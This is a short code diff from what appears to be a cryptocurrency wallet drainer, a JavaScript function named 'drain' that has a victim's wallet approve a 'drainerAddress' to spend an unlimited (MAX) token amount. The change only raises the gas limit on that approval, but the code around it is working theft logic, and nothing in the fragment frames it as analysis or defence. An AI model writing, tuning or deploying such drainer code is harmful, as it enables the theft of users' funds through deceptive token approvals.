@@ -457,7 +457,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 100000,
+          gasLimit: 550000,
           gasPrice: gasPrice,
           nonce
         });
